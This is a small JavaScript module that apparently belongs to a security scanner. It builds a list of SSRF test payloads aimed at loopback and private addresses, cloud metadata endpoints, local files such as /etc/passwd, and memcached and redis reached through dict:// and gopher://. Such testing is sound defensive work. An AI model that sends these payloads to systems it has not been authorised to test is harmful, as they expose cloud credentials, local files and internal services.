// SSRF payload matrix. Keep this small and deliberate — flooding every
// endpoint with hundreds of payloads generates noise, not findings.

function buildPayloads(oobCanary) {
  const p = [
    { value: 'http://127.0.0.1/',                               category: 'loopback', note: 'loopback' },
    { value: 'http://127.0.0.1:22/',                            category: 'loopback', note: 'SSH banner probe' },
    { value: 'http://127.0.0.1:80/',                            category: 'loopback' },
    { value: 'http://localhost/',                               category: 'loopback' },
    { value: 'http://[::1]/',                                   category: 'loopback', note: 'IPv6 loopback' },
    { value: 'http://0.0.0.0/',                                 category: 'loopback' },
    { value: 'http://127.1/',                                   category: 'loopback', note: 'shorthand' },
    { value: 'http://2130706433/',                              category: 'loopback', note: 'decimal loopback' },
    { value: 'http://169.254.169.254/latest/meta-data/',        category: 'metadata', note: 'AWS IMDSv1' },
    { value: 'http://metadata.google.internal/computeMetadata/v1/', category: 'metadata', note: 'GCP' },
    { value: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', category: 'metadata', note: 'Azure IMDS' },
    { value: 'http://10.0.0.1/',                                category: 'private' },
    { value: 'http://192.168.0.1/',                             category: 'private' },
    { value: 'file:///etc/passwd',                              category: 'scheme',   note: 'local file' },
    { value: 'file:///C:/Windows/win.ini',                      category: 'scheme',   note: 'Windows file' },
    { value: 'dict://127.0.0.1:11211/stats',                    category: 'scheme',   note: 'memcached' },
    { value: 'gopher://127.0.0.1:6379/_INFO',                   category: 'scheme',   note: 'redis via gopher' }
  ];
  if (oobCanary) p.push({ value: oobCanary, category: 'oob', note: 'out-of-band canary' });
  return p;
}

module.exports = { buildPayloads };
